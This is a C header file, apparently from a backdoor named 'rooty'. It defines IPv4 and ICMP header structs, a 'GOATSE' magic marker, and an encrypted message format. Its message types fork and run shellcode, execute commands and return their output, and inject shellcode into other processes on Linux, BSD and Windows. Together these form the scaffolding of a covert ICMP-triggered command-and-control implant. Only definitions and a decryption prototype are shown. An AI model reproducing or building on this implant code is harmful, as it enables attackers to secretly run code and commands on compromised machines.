#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>


#define SIZE_ETHERNET   14
#define SIZE_COOKED     16
#define STACK_SIZE      0x40000000
#define MAX_PACKET_SIZE 1024
#define MAGIC           "GOATSE"
#define REDIRECT		   " 2>&1"
#define BLOCK_SIZE      128

#define MESSAGE_RESPONSE 		      0x00  // Response
#define MESSAGE_SHELLCODE 		      0x01  // Fork and run the shellcode
#define MESSAGE_COMMAND 		      0x02  // Run a command and send back the response
#define MESSAGE_REMOTE_SHELLCODE	  0x04  // Inject shellcode into another process

#define MESSAGE_ARCH_X64            0x10
#define MESSAGE_OS_WINDOWS          0x20
#define MESSAGE_OS_BSD              0x40   
#define MESSAGE_OS_LINUX            0x80

#ifdef __unix__
   #define BSD
#endif

#ifdef __linux__
   #define LINUX
   #define MESSAGE_OS MESSAGE_OS_LINUX
#endif

#ifdef __MINGW32__
   #define WINDOWS
#endif

#ifdef __MINGW64__
   #define WINDOWS
#endif

#if (__WORDSIZE == 64)
    #define MESSAGE_ARCH MESSAGE_ARCH_X64
#else
    #define MESSAGE_ARCH 0
#endif

#ifdef DEBUG
#define DEBUG_WRAP(code) code
#else
#define DEBUG_WRAP(code)
#endif


#define LOG(level, ...) { fprintf(stderr, "%s: ", level); fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); }
#define LOG_ERROR(...) { LOG("ERROR", __VA_ARGS__); }
#define LOG_DEBUG(...) { DEBUG_WRAP(LOG("DEBUG", __VA_ARGS__)); }


typedef struct __attribute__((__packed__)) ip_hdr {
   uint8_t ip_header_len:4;
   uint8_t ip_version:4;
   uint8_t ip_tos;
   uint16_t ip_total_length;
   uint16_t ip_id;
   uint8_t ip_frag_offset:5;
   uint8_t ip_more_fragment:1;
   uint8_t ip_dont_fragment:1;
   uint8_t ip_reserved_zero:1;
   uint8_t ip_frag_offset1;
   uint8_t ip_ttl;
   uint8_t ip_protocol;
   uint16_t ip_checksum;
   uint32_t ip_srcaddr;
   uint32_t ip_destaddr;

} IPV4_HDR;

typedef struct __attribute__((__packed__)) icmp_hdr {
  uint8_t type;     /* message type */
  uint8_t code;     /* type sub-code */
  uint16_t checksum;
  union
  {
    struct
    {
      uint16_t   id;
      uint16_t   sequence;
    } echo;       /* echo datagram */
    uint32_t  gateway; /* gateway address */
    struct
    {
      uint16_t   unused;
      uint16_t   mtu;
    } frag;       /* path mtu discovery */
  } un;
} ICMP_HDR;


typedef struct __attribute__((__packed__)) rooty_message {
    uint8_t     key[BLOCK_SIZE];
    uint8_t     magic[6];
    uint8_t     type;
    uint16_t    len;
    uint8_t     data[];
} ROOTY_MESSAGE;

uint32_t decrypt_message(ROOTY_MESSAGE *msg, uint32_t len);
